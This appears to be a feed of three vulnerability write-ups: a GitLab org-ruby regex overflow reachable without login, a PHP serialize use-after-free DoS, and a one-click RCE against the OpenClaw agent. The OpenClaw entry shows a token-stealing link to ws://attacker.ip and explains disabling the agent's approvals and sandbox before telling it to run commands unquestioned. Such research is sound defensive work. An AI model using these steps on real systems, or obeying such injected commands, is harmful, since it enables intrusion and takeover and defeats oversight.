The #+TODO: line registers the pattern as a keyword (escaped for matching). The headline’s first word matches it (because \{ matches literal {). Then line 100 does:

With 32,769 repetitions of x{0,8}, that’s 32,769 range-repeat groups fed directly to Onigmo’s compiler. The integer overflow happens there.

Not every quantifier counts

I spent some time figuring out the minimum pattern that actually overflows the counter. Onigmo has an optimization: quantifiers with a small range don’t produce OP_REPEAT nodes.

Testing against the vulnerable Ruby 3.3.12:

PatternOP_REPEAT?Why
x?, x*, x+NoCompiled to simpler OP_REPEAT_INC variants
x{0,7}NoRange (7-0=7) below the threshold
x{0,8}YesRange (8-0=8) hits the OP_REPEAT path
x{3,11}YesRange (11-3=8) also hits it
(?:x){0,3}YesGroups always get OP_REPEAT regardless of range

The threshold is a range of 8 or more for bare-character quantifiers. Groups always use OP_REPEAT.

This means x{0,8} is the shortest bare-character quantifier that creates a repeat node: 6 characters. To overflow, you need 32,769 of them: x{0,8} repeated 32,769 times = 196,614 characters, about 192 KB. The .org file with the #+TODO: and headline lines is about 400 KB. Well under both Puma’s body limits and GitLab’s blob rendering limit.

Alternations (a|b|c|...) don’t increment num_repeat at all, no matter how many branches. I tested 40,000 alternations on the vulnerable Ruby and they compile fine.

Reproduction

The repo splits the PoC into two scripts to make the pre-auth nature obvious. setup.py boots a vulnerable GitLab CE in Docker, creates a token, and pushes the crafted .org file. poc.py is the actual exploit: one anonymous GET, zero credentials, pure HTTP.

Here’s the output from my lab:

That single anonymous GET is the entire exploit. The .org file goes through org-ruby, headline.rb:100 compiles the raw pattern via Regexp.new, and the overflow happens inside the Puma worker.

On the fixed Ruby from GitLab CE 19.4.3, the same pattern is rejected at compile time with RegexpError: too many range repeat. No memory corruption.

What the OOB write actually does

The overflowed repeat id is a negative signed short. At match time, match_at() uses it to index into the repeat stack array: repeat_stk[id]. A negative id means the write lands somewhere before the array, at whatever heap address that offset resolves to.

What happens next depends entirely on heap layout. The Puma worker has about 1 GB of heap: Rails, gems, caches, request objects. That’s a lot of mapped memory. Over 50 exploit requests to a fresh GitLab instance I saw all three outcomes:

SIGSEGV (segmentation fault): the OOB write hits an unmapped or protected memory page. The worker crashes immediately.

SIGILL (illegal instruction): the OOB write overwrites executable memory or a function pointer. The CPU jumps to corrupted bytes and faults on an invalid instruction. From an RCE standpoint this is the interesting one: the same mechanism that produces SIGILL with random data could produce code execution with controlled data.

Silent corruption (HTTP 200): the OOB write lands on valid, non-critical memory. The worker keeps running. No exception, no log entry, no restart. This is the most common outcome and the hardest to detect.

In 50 requests, I got 46 HTTP 200s and 4 worker crashes (3 SIGSEGV, 1 SIGILL). Every crash comes from headline.rb:100, and the crash addresses are different each time because heap layout changes after each worker respawn. You can reproduce this with verify.py in the repo, which sends exploit requests and reads the crash signals from puma_stderr.log.

There’s a fourth outcome that shows up occasionally: the OOB write corrupts the regex bytecode buffer itself. The matcher reads garbage opcodes and raises undefined bytecode (bug) or invalid multibyte character, producing an HTTP 500. These are not “invalid regex” errors. The regex compiled successfully on the vulnerable Ruby. The errors come from executing the compiled pattern after the OOB write has already corrupted memory.

After running poc.py a few times, the crashes show up in the container’s Puma log. Here’s a raw excerpt from puma_stderr.log on my lab instance:

The Ruby stack shows the crash at headline.rb:100 (the Regexp.new injection) via sub!. The C stack shows it dying inside Onigmo’s match_at() at regexec.c:3836, which is the repeat stack indexing code where the negative id writes out of bounds.

Check it yourself:

Or automate it with verify.py, which sends requests and reads that log for you.

From a defender’s perspective, the silent corruption is worse than the crashes. A crash at least triggers a worker restart and shows up in puma_stderr.log. The silent case leaves no trace.

Ruby’s regression test catches the compile step

The upstream fix commit adds two tests:

100,000 repeats, well past 32,767. On a fixed Ruby, Regexp.new raises. On an unfixed Ruby, it compiles silently. That difference is enough to tell a fixed build from an unfixed one without going anywhere near the bad index.

Running it inside the official images

You can also check any image directly without booting GitLab. Run the bundled Ruby in an isolated container:

No GitLab services start, nothing listens, the container can’t reach the network.

Full table, pulled from Docker Hub on October 22:

ImageArchlibruby.so.3.3.12 sha256Fix stringsPatternsVerdict
gitlab-ce:19.4.2-ce.0arm644441d273...2e46c1nocompiledvulnerable
gitlab-ce:19.4.3-ce.0arm64e91c2005...b7a6f6yesrejectedfixed
gitlab-ce:19.5.0-ce.0arm64e91c2005...b7a6f6yesrejectedfixed
gitlab-ce:19.5.1-ce.0arm64e91c2005...b7a6f6yesrejectedfixed
gitlab-ce:19.4.2-ce.0amd641e670f2f...aaf4cenocompiledvulnerable
gitlab-ce:19.5.0-ce.0amd64bc623ba3...05b65yesrejectedfixed

GitLab already knew about this bug class

Here’s something interesting I found while reviewing the source. In ee/lib/gitlab/ci/config/entry/rules/rule/clause.rb, GitLab has this:

They already had guards against Onigmo overflow in CI rule patterns, with a hardcoded limit of 1,000 repeats and a comment that references a related Ruby fix. But this only protects the CI pipeline regex path, which is post-authentication. The org-ruby rendering path was completely unprotected, and that’s the one reachable pre-auth.

GitLab also wraps most user-supplied regex patterns in UntrustedRegexp, which uses Google’s RE2 engine instead of Onigmo. RE2 is immune to this bug. But org-ruby doesn’t go through UntrustedRegexp. It uses plain Ruby Regexp.new, which goes straight to Onigmo.

References

  • GitLab patch release 19.5.1
  • CVE-2026-110264 record
  • Ruby fix, 493d26d / PR #16801
  • omnibus-gitlab!9922, CNG!3168
  • org-ruby 0.9.12 headline.rb:100 (the Regexp.new injection site)
  • Repo with PoC, verification and check scripts
entry.summary: Full root cause: Onigmo's signed-short repeat counter overflows at 32,768. org-ruby headline.rb feeds raw user input to Regexp.new, reachable pre-auth via GitLab's .org file viewer.
entry.title: CVE-2026-110264: From Onigmo's 16-bit Regex Counter to Pre-Auth SIGSEGV in GitLab via org-ruby

entry.content:
What’s this?

A deep dive into a use-after-free vulnerability in PHP’s serialization subsystem. We’ll trace the bug from its root cause in zend_bailout()‘s longjmp-based error handling, through the Zend Memory Manager’s arena recycling, all the way to a 100% reliable denial-of-service against Apache mod_php prefork workers.

Tested on PHP 8.3.20, Apache 2.4.62, WordPress 6.7.

Cyber Scam (Grumble)

I feel like this vulnerability is getting completely blown out of proportion. Even before the patch dropped, we saw a flood of threat intel and publications hyping it up like it’s the next Log4j.

Sure, theoretically it can lead to RCE, but from my own analysis, it’s not nearly that straightforward. I’ve managed to trigger a DoS with 100% success, but pulling off an RCE in practice is genuinely difficult.

That said, I did see that RCE demo video on X from October 20—it looks pretty promising, and I’d really appreciate it if someone could share the exploit so I can dive in and learn from it (assuming, of course, that the video wasn’t generated by Sora or Seedance 😅).

On a serious note, a quick shoutout to the security research community: please don’t overhype a vulnerability’s impact unless you’re 100% certain it deserves that level of panic and you can actually back up your claims. Otherwise, it just wastes public resources and delays things that actually matter—like my sleep.

PHP Module Lifecycle 101

Every PHP extension goes through a fixed set of lifecycle callbacks. If you’ve written a PHP extension, you’ve filled out this struct:

Here’s how they relate to each other in the Apache prefork model, where a single worker process handles many requests sequentially:

graph LRMINIT(["MINIT\n(once, process start)"])MSHUTDOWN(["MSHUTDOWN\n(once, process end)"])subgraph req1["Request 1"]    R1_RINIT["RINIT"] --> R1_SCRIPT["PHP Script"] --> R1_RSHUTDOWN["RSHUTDOWN"]endsubgraph req2["Request 2"]    R2_RINIT["RINIT"] --> R2_SCRIPT["PHP Script"] --> R2_RSHUTDOWN["RSHUTDOWN"]endsubgraph reqN["Request N"]    RN_RINIT["RINIT"] --> RN_SCRIPT["PHP Script"] --> RN_RSHUTDOWN["RSHUTDOWN"]endMINIT --> req1 --> req2 -.-> reqN --> MSHUTDOWNstyle MINIT fill:#4a9eff,color:#fffstyle MSHUTDOWN fill:#ff6b6b,color:#fffstyle R1_RINIT fill:#51cf66,color:#fffstyle R1_RSHUTDOWN fill:#ffa94d,color:#fffstyle R2_RINIT fill:#51cf66,color:#fffstyle R2_RSHUTDOWN fill:#ffa94d,color:#fffstyle RN_RINIT fill:#51cf66,color:#fffstyle RN_RSHUTDOWN fill:#ffa94d,color:#fff
  • MINIT (Module Init) — runs once when the module is loaded. Sets up persistent resources, registers classes, hooks global callbacks. Survives across all requests.
  • RINIT (Request Init) — runs at the start of every request. Resets per-request state in module globals. This is where ext/standard (the “basic” module) does memset(&BG(serialize), 0, sizeof(BG(serialize))).
  • RSHUTDOWN (Request Shutdown) — runs at the end of every request. Cleans up per-request resources. Critically: ext/standard‘s RSHUTDOWN does not reset BG(serialize).
  • MSHUTDOWN (Module Shutdown) — runs once when the module is unloaded.

Module globals (accessed via the BG() macro for ext/standard) are allocated once at MINIT and persist for the entire process lifetime. They are not freed between requests. Only the RINIT callback resets them.

This becomes important.

The Request Startup Sequence

When Apache hands a new HTTP request to a PHP worker, php_request_startup() in main/main.c runs the following sequence:

The order matters:

StepFunctionWhat it does
1zend_activate()Creates a fresh Zend Memory Manager (ZMM) heap for this request
2sapi_activate()Initializes the web server interface, reads headers
3php_hash_environment()Parses POST body, multipart uploads, cookies. Upload-progress callbacks fire here
4zend_activate_modules()Runs every extension’s RINIT. This is where BG(serialize) gets zeroed
5PG(modules_activated) = 1The PHP script starts executing after this

Step 3 happens before step 4. That’s the entire vulnerability.

BG(serialize) — The Serialization Context

When you call serialize() in PHP, the engine needs to track circular references and object identity across the serialization pass. It stores this tracking state in a per-module-global structure:

The serialize context (php_serialize_data) contains a HashTable used for reference tracking. When serialize() is called, php_var_serialize_init() manages this context:

The reuse path is designed for nested serialization — when a __sleep() or __serialize() method calls serialize() again during an outer serialize() call. In that case, level > 0 is legitimate and data points to a valid, live context.

But what if level > 0 for a different reason?

zend_bailout() — PHP’s Nuclear Option

PHP’s error handling for fatal errors (OOM, timeouts, etc.) uses zend_bailout(), which is a wrapper around C’s longjmp():

longjmp() unwinds the C call stack to the nearest setjmp() point, skipping all intermediate function returns. No destructors run. No finally blocks execute. No cleanup code after the longjmp() point is reached.

When serialize() is processing a large data structure and hits memory_limit:

php_var_serialize_destroy() (the macro PHP_VAR_SERIALIZE_DESTROY) is the function that would have done:

It never runs. BG(serialize) is left with level = 1 and data pointing to a php_serialize_data struct that was allocated from the request’s ZMM heap.

The Bug

Now let’s trace what happens across two requests on the same Apache prefork worker.

Request A: OOM during serialize()

At this point, BG(serialize).data is a dangling pointer. The memory it points to was part of ZMM heap H1, which has been destroyed.

Request B: Upload-progress triggers UAF

Here’s the full picture:

sequenceDiagramparticipant A as Request A (OOM)participant BG as BG(serialize)participant H as ZMM Heapparticipant B as Request B (upload)Note over A: serialize($big_array)A->>BG: level=1, data=pNote over A: OOM! zend_bailout() longjmp skips serialize_destroyrect rgb(120, 40, 40)    Note over BG: level=1, data=p (NOT reset by RSHUTDOWN!)endA->>H: RSHUTDOWN / zend_deactivate()Note over H: free(p)Note over A: Request A donerect rgb(120, 40, 40)    Note over BG: level=1, data=p — p is now DANGLINGendNote over H: zend_activate() — new heap H2 reuses same pagesrect rgb(40, 40, 100)    Note over H: ZMM chunk bookkeeping now lives at addr pendB->>BG: php_hash_environment() upload-progress firesrect rgb(120, 40, 40)    Note over BG: level=1 lock=0 — reuses data=p    BG-->>H: deref p — reads ZMM metadata as HashTable    Note over H: arData = garbage — SIGSEGVendNote over B: CRASHNote over BG: zend_activate_modules() RINIT resets state — TOO LATE

The critical detail: php_hash_environment() (step 3) runs before zend_activate_modules() (step 4) in php_request_startup(). The upload-progress callback fires during step 3. The RINIT that would have cleaned BG(serialize) runs during step 4.

The Trigger: Upload-Progress Callback

PHP has a built-in feature called session upload progress. When a multipart POST contains a field named PHP_SESSION_UPLOAD_PROGRESS and the request includes a PHPSESSID cookie, PHP’s RFC 1867 multipart parser calls php_session_rfc1867_callback() during php_hash_environment().

This callback:

  1. Opens (or creates) a session
  2. Writes upload progress data to it
  3. Calls php_session_encode() → php_var_serialize() to serialize the session data

This is the code path that hits the stale BG(serialize) context.

session.upload_progress.enabled is On by default in PHP. No special configuration needed. No pre-existing session needed — PHP creates one on the fly. The attacker just needs to:

  1. Send a PHPSESSID cookie (any value)
  2. Include a PHP_SESSION_UPLOAD_PROGRESS form field in the multipart body
  3. Include a file upload field

That’s it. No authentication required. Any PHP endpoint that accepts POST works.

Why It Crashes 100% of the Time

This is the part I didn’t expect. The first time I reproduced this, I assumed ZMM’s arena recycling would leave the freed address pointing at zero-filled memory, making the UAF silently benign. I was wrong.

ZMM Chunk Recycling

PHP’s Zend Memory Manager allocates memory in 2MB chunks. When a request ends:

In the Apache prefork model, zend_mm_shutdown() is called with full = false. The main chunk is not munmap‘d. It’s reinitialized for the next request. And zend_mm_init() — which sets up the new heap inside this recycled chunk — does not memset the chunk. It only writes specific bookkeeping fields:

  • chunk->heap pointer
  • chunk->next / chunk->prev linked-list pointers
  • chunk->free_pages, chunk->free_tail, chunk->num
  • chunk->free_map[] — page allocation bitmask
  • chunk->map[] — page type descriptors

Where the Stale Pointer Lands

The stale BG(serialize).data pointer (e.g., 0xffff94872040) points to an offset within the old main chunk. After zend_mm_init() reinitializes the same chunk for the new request, that offset now contains ZMM bookkeeping data — free_map entries, map entries, heap metadata.

This data is always non-zero. When php_var_serialize_init() interprets it as a php_serialize_data struct:

arData = 0xfffffffe00000008 is an unmapped address. Any dereference is a guaranteed segfault. Or, if the code tries to iterate nNumUsed = 2.5 billion entries, it loops until max_execution_time kills the process.

The stale pointer lands in the same chunk bookkeeping region every time because:

  1. serialize() allocates php_serialize_data early in the request — from the main chunk’s first usable pages
  2. The offset within the chunk is deterministic (same code path, same allocation order)
  3. After shutdown + reinit, the same chunk is reused without zeroing
  4. The bookkeeping data at that offset is always non-zero

It’s not probabilistic. It’s structural.

Instrumentation Evidence

We built a custom PHP extension (serialize_probe) to log BG(serialize) state at each lifecycle phase. Here’s the output for one attack cycle:

No RINIT for Request B. The worker never made it past php_hash_environment().

Proof of Concept

Full PoC code, lab setup, and pcap available on GitHub: al4n4n/php2shell

The full attack requires only 2 HTTP requests on one keep-alive TCP connection:

Setup

The only non-default setting that matters is memory_limit = 16M (PHP default is 128M). This controls how large the serialized data needs to be to trigger OOM. At 128M, you need a ~100MB data structure; at 16M, ~5MB is enough.

session.upload_progress.enabled = On is the PHP default. No configuration change needed for the trigger.

Server-Side PHP

trigger_serialize_bailout.php — Triggers OOM during serialize():

target.php — Target for the upload-progress POST (any PHP file works):

Exploit Script

Result

A packet capture of the attack is included: exploit.pcap

Impact

Denial of Service. An unauthenticated attacker can kill Apache prefork workers one by one with 2 HTTP requests each. By repeating across connections, the attacker exhausts the worker pool faster than Apache can respawn them.

Conditions:

  • Apache mod_php with prefork MPM (the classic LAMP stack)
  • session.upload_progress.enabled = On (PHP default)
  • An endpoint that triggers serialize() on data large enough to OOM. With memory_limit = 16M, a 5MB array suffices; at 128M, a ~100MB data structure is needed

Remote Code Execution?

  • Workers are fork()ed from the parent — address space layout (ASLR slide, PHP binary base, libc) is identical across all requests to the same worker
  • Maybe attacker can probe the worker on request A (trigger the OOM), then exploit on request B over the same connection (Connection: keep-alive) to guarantee the same PID
  • **The main challenge is heap grooming: predicting exactly where the old php_serialize_data lands relative to request B’s allocations on the new heap. Or try ‘a few’ more times? **

All source code, lab setup, and packet captures: github.com/al4n4n/php2shell
entry.summary: PHP2Shell root cause: zend_bailout() leaves BG(serialize) dangling and upload-progress reuses it before RINIT. A 100% reliable DoS PoC, and why RCE is hard.
entry.title: PHP2Shell (CVE-2026-109618, CVE-2026-109619): PHP Use-After-Free From zend_bailout() to a 100% Reliable PoC

Reference

  • https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys
  • https://ethiack.com/news/blog/one-click-rce-moltbot

What’s the difference between this analysis vs the above two

This analysis provides a detailed source-code-level breakdown, explains all the errors you may encounter when reproducing this vulnerability, and includes a working PoC.

Grumble

I’m a huge fan of new technology, so when OpenClaw was still called MoltBot I deployed it on my home server. Considering the security concerns, I deployed it in a Docker container and ran the gateway inside the same container, thinking it should be fine. Then I saw this vulnerability and got sweat on my whole back. Yes, I can confirm they are not bluffing—just 1 click can lead to RCE.

Everything you need to know about OpenClaw

OpenClaw is a super agent consisting of two major parts (in my opinion): the Control UI and the Gateway. The Control UI is a frontend interface where you can talk to the bot and configure settings. The OpenClaw Gateway is the backend WebSocket server that runs the OpenClaw control plane (channels, sessions, auth, etc.) where the smart agent actually runs. The Control UI silently talks to the Gateway using WebSocket.

Summarizing the root cause

I’ll give my brief here, and I highly recommend you read the DepthFirst blog for the root cause analysis, which is where I started as well. But to be honest, that blog is also missing some details—don’t worry, I’ll cover all the missing pieces here.

This RCE vulnerability consists of 3 different vulnerabilities:

  1. CSRF → leads to auth token theft
  2. Cross-Site WebSocket Hijacking + Missing Origin header validation → leads to security feature bypass
  3. Unconditional trust in AI → leads to RCE

Step 1 - Get the correct token

In OpenClaw there is a parameter gatewayUrl which can be appended to the default WebUI URI to configure the gateway address. During onboarding, you have a chance to input the gateway address or choose “local” (which means localhost or 127.0.0.1). You can also configure this parameter later by adding it to the URL.

There is no validation for that parameter value, so if an attacker uses their server address as the value and lures the victim to click that link, it becomes a CSRF. What’s more, when the Control UI first connects to the gateway, it sends its auth token along with the WebSocket connect request.

Error 1 - Token mismatch

Here comes the first trap when reproducing this vulnerability. OpenClaw has two types of auth tokens: the device token and the UI token. It prefers the device token if present, but falls back to the UI token (this.opts.token). If the device token fails, it clears it so the next reconnect uses the UI token. The device token cannot be used in this attack scenario—we need the UI token.

Storage KeyContentsPurpose
clawdbot.device.auth.v1Device-specific token issued by gatewayPer-device authentication
clawdbot.control.settings.v1{ gatewayUrl, token, ... }Shared/configured gateway token

See the picture below—the second row clawdbot.control.settings.v1 auth token is what we want. When reproducing, remember to check if the token you captured matches this one; otherwise you may see the warning: unauthorized: gateway token mismatch (set gateway.remote.token to match gateway.auth.token)

To get the UI auth token we need to reject the first connectiong request from the victim to trigger the fallback and wait for the second connection request with the token we need.

Error 4 - Don’t use iframe

If you use an iframe to embed the CSRF payload in the victim landing page, you may not be able to access the token. This happened to me, and thanks to Claude AI, I learned this is due to Browser Storage Partitioning. We can use a pop-up window to solve this problem. Step 2 - Disabling security features

Error 5 - Hijacking the WebSocket

When I first saw this vulnerability, I thought the “1-click” was clicking the CSRF payload URL http://127.0.0.1:18789?gatewayUrl=ws://attacker.ip—but it’s not. That URL lets the attacker get the token, but the attacker cannot send requests to the OpenClaw gateway running on the victim’s localhost. To do that, we must use Cross-Site WebSocket Hijacking. The key point is that browsers block JavaScript from reading responses to cross-origin HTTP requests per the Same-Origin Policy, but allow cross-origin WebSocket connections!

We need to create an HTML webpage that includes the CSRF URL and lure the victim to access that HTML page. We can use the auth token stolen from Step 1 and embed requests to disable approvals and sandbox. We can find the API request format in the source code. Also note: the Gateway reads the Origin header but does not validate it against an allowlist.

Or even better, you can use exec.approvals.get to see the required format:

Step 3 - Run the code

Now we have successfully stolen the victim’s credentials and opened our own authenticated connection to their Gateway—this is credential theft + session hijacking, not man-in-the-middle. With all security features disabled, we can impersonate the Control UI and ask the Gateway to run malicious commands without alerting the victim, who is staring at the real UI.

Error 6 - Ask the agent to run the command

I initially tried to find some API that allows me to create a cron job with a malicious command embedded, but then I suddenly realized—why not use the powerful OpenClaw bot itself! We can hijack the connection and just send a WebSocket message to the gateway: “Hey, run this command <malicious command> without any questions.”

Error 7 - Need a session ID

You may see this error: Error: Pass --to <E.164>, --session-id, or --agent to choose a session if you’re missing a necessary element: the session ID. This is because:

It’s very easy to bypass. The default session ID is called main and its sessionKey is agent:main:main. You can find it by capturing normal traffic. Just use it and give the gateway your instruction!
